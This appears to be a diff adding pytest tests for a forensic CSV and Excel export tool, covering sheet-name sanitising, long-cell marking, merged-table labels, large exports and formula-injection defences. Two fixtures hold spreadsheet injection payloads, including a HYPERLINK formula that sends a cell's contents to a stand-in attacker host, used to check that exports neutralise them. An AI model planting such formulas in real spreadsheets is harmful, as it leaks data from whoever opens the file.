@@ -95,3 +95,146 @@ def test_csv_export_includes_derived_columns(store, write_csv):
     lines = text.strip().splitlines()
     assert lines[0].endswith(",Host")
     assert lines[1].endswith(",a.example") and lines[2].endswith(",b.example")
+
+
+def test_xlsx_sheet_names_survive_control_characters_truncation_and_reserved_names(store, write_csv, tmp_path):
+    """A sheet name is XML text in workbook.xml: a BEL in a source name
+    (names keep what the file was called) produced a workbook that would
+    not open again. The 31-character cut could also end a name in an
+    apostrophe Excel refuses there, and "History" is reserved."""
+    path = write_csv([["a"], ["1"]], name="x.csv")
+    tag = store.upsert_tag(None, "T", "#000000", None)
+    for name in ["evil\x07name.csv", "A" * 30 + "'s log.csv", "History"]:
+        sid = store.ingest_csv(path, name=name, build_fts=False)["id"]
+        store.set_tags(sid, [1], tag["id"], True)
+
+    tagged = load_workbook(store.export_tagged_xlsx()).sheetnames
+    out = tmp_path / "all.xlsx"
+    store.export_all_xlsx(str(out))
+    for names in (tagged, load_workbook(str(out)).sheetnames):
+        assert len(names) == 3
+        for n in names:
+            assert len(n) <= 31 and not n.startswith("'") and not n.endswith("'")
+            assert not any(ord(ch) < 32 for ch in n)
+            assert n.lower() != "history"
+        assert names[0] == "evil_name.csv"
+
+
+def test_xlsx_cell_too_long_for_excel_is_marked_not_silently_cut(store, write_csv):
+    """Excel holds 32,767 characters per cell and openpyxl cut longer
+    values there without a word — an encoded command line that looks
+    complete and isn't. The cut is marked, and says how long it was."""
+    path = write_csv([["cmd"], ["A" * 40000], ["short"]], name="long.csv")
+    sid = store.ingest_csv(path, name="long.csv", build_fts=False)["id"]
+    tag = store.upsert_tag(None, "T", "#000000", None)
+    store.set_tags(sid, [1, 2], tag["id"], True)
+    ws = load_workbook(store.export_tagged_xlsx()).worksheets[0]
+    cell = ws["D2"].value
+    assert len(cell) <= 32767
+    assert cell.startswith("A" * 30000) and "cut" in cell and "40,000" in cell
+    assert ws["D3"].value == "short"
+
+
+def test_csv_export_of_a_merge_says_which_table_each_row_is_from(store, write_csv):
+    """Line is a rid within ONE member, so a merged export had two rows
+    reading "Line 1" and nothing saying which file either came from. A
+    merge's export names the member (as the sidebar does, nickname
+    first); a single table's export is unchanged."""
+    a = store.ingest_csv(write_csv([["user"], ["alice"], ["bob"]], name="hostA.csv"),
+                         name="hostA_Security.csv", build_fts=False)["id"]
+    b = store.ingest_csv(write_csv([["user"], ["carol"], ["dave"]], name="hostB.csv"),
+                         name="hostB_Security.csv", build_fts=False)["id"]
+    store.set_source_nickname(b, "Host B")
+    tag = store.upsert_tag(None, "Keep", "#ff0000", None)
+    store.set_tags(a, [1], tag["id"], True)
+    store.set_tags(b, [1], tag["id"], True)
+    mid = store.create_merge("M", [a, b])["id"]
+    view = store.build_view(mid, {"filters": [], "sort": [{"column": "user", "dir": "asc"}]})
+
+    rows = list(csv.reader(io.StringIO(_export_csv_text(store, view["view_id"], tagged_only=True))))
+    assert rows[0] == ["Line", "Table", "Tags", "Note", "user"]
+    assert rows[1:] == [["1", "hostA_Security.csv", "Keep", "", "alice"],
+                        ["1", "Host B", "Keep", "", "carol"]]
+
+    single = store.build_view(a, {"filters": [], "sort": [{"column": "user", "dir": "asc"}]})
+    assert next(csv.reader(io.StringIO(_export_csv_text(store, single["view_id"])))) == \
+        ["Line", "Tags", "Note", "user"]
+
+
+FORMULA_HEADER = '=HYPERLINK("http://evil.example/?"&A2,"click")'
+FORMULA_TAG = '=HYPERLINK("http://evil.example","open")'
+
+
+def _formula_case(store, write_csv):
+    path = write_csv([[FORMULA_HEADER, "@SUM(1+1)", "plain"], ["a", "b", "c"], ["d", "e", "f"]],
+                     name="hdr.csv")
+    sid = store.ingest_csv(path, name="hdr.csv", build_fts=False)["id"]
+    tag = store.upsert_tag(None, FORMULA_TAG, "#ff0000", None)
+    store.set_tags(sid, [1], tag["id"], True)
+    return sid
+
+
+def test_csv_export_neutralises_formula_column_and_tag_names(store, write_csv):
+    """Column names are header text from the evidence file and tag names
+    arrive in adopted sessions; both went into the CSV raw while every cell
+    beside them was prefixed. Both the virtual (unfiltered) and the
+    materialised (sorted) export paths."""
+    sid = _formula_case(store, write_csv)
+    for spec in ({"filters": [], "sort": []},
+                 {"filters": [], "sort": [{"column": "plain", "dir": "desc"}]}):
+        view = store.build_view(sid, {"source_id": sid, **spec})
+        rows = list(csv.reader(io.StringIO(_export_csv_text(store, view["view_id"]))))
+        assert rows[0][3:] == ["'" + FORMULA_HEADER, "'@SUM(1+1)", "plain"]
+        tagged = next(r for r in rows[1:] if r[0] == "1")
+        assert tagged[1] == "'" + FORMULA_TAG
+
+
+def test_xlsx_exports_never_write_a_header_as_a_formula(store, write_csv, tmp_path):
+    """openpyxl writes any string starting with '=' as a FORMULA — an
+    attacker-named column became a live HYPERLINK in the hand-over
+    workbook's header row."""
+    _formula_case(store, write_csv)
+    path = tmp_path / "all.xlsx"
+    store.export_all_xlsx(str(path))
+    for wb in (load_workbook(store.export_tagged_xlsx()), load_workbook(str(path))):
+        header = list(wb.worksheets[0][1])
+        assert all(c.data_type != "f" for c in header)
+        assert [c.value for c in header[3:]] == ["'" + FORMULA_HEADER, "'@SUM(1+1)", "plain"]
+
+
+def test_tagged_xlsx_exports_more_tagged_rows_than_sqlite_binds(stock_sqlite_limits, write_csv):
+    """Every tagged rid of a source went into one `IN (...)`, so past
+    32,766 tagged rows — on a stock SQLite build — the workbook was a 500
+    ("too many SQL variables"). The rows are now read in keyset pages."""
+    store = stock_sqlite_limits
+    n = 32_800
+    sid = store.ingest_csv(write_csv([["x"]] + [[f"v{i}"] for i in range(n)], "many.csv"),
+                           name="many.csv", build_fts=False)["id"]
+    view = store.build_view(sid, {"source_id": sid, "filters": [], "sort": []})
+    tag = store.upsert_tag(None, "Malware", "#ff0000", None)["id"]
+    store.tag_view(view["view_id"], tag, True)
+    store.set_note(sid, n, "the last one")
+
+    ws = load_workbook(store.export_tagged_xlsx(), read_only=True).worksheets[0]
+    rows = list(ws.iter_rows(values_only=True))
+    assert len(rows) == n + 1
+    assert rows[1] == (1, "Malware", None, "v0")
+    assert rows[-1] == (n, "Malware", "the last one", f"v{n - 1}")
+
+
+def test_tagged_xlsx_continues_past_a_full_sheet(store, write_csv, monkeypatch):
+    """No continuation past Excel's row cap: a table with more tagged rows
+    than one sheet holds made a workbook Excel refuses to open. Same
+    numbered continuation sheets as the all-tables export."""
+    from winnow import store as store_mod
+    monkeypatch.setattr(store_mod, "XLSX_MAX_ROWS", 4)     # 3 data rows per sheet
+    sid = store.ingest_csv(write_csv([["x"]] + [[f"v{i}"] for i in range(8)], "t.csv"),
+                           name="t.csv", build_fts=False)["id"]
+    tag = store.upsert_tag(None, "T", "#ff0000", None)["id"]
+    store.set_tags(sid, [1, 2, 3, 5, 6, 7, 8], tag, True)
+
+    wb = load_workbook(store.export_tagged_xlsx())
+    assert wb.sheetnames == ["t.csv", "t.csv (2)", "t.csv (3)"]
+    lines = [[r[0] for r in wb[n].iter_rows(min_row=2, values_only=True)] for n in wb.sheetnames]
+    assert lines == [[1, 2, 3], [5, 6, 7], [8]]
+    assert all([c.value for c in wb[n][1]] == ["Line", "Tags", "Note", "x"] for n in wb.sheetnames)
